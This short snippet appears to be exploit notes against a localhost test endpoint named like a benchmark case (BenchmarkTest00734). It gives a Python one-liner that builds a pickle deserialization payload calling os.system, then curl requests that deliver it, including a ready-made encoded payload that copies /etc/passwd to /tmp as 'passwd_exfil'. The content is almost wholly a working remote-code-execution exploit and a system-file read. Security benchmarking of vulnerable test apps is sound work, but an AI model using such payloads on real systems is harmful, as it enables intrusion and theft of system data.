# For any command execution, craft a pickle RCE payload:
python3 -c "
import pickle, base64, os
class RCE:
    def __reduce__(self):
        return (os.system, ('COMMAND',))
b64 = base64.urlsafe_b64encode(pickle.dumps(RCE())).decode()
print(b64)
"
# Then send:
curl -s 'http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00734?BenchmarkTest00734=<b64_payload>'

# Example - read /etc/passwd:
curl -s 'http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00734?BenchmarkTest00734=gASVPgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCNjYXQgL2V0Yy9wYXNzd2QgPiAvdG1wL3Bhc3N3ZF9leGZpbJSFlFKULg=='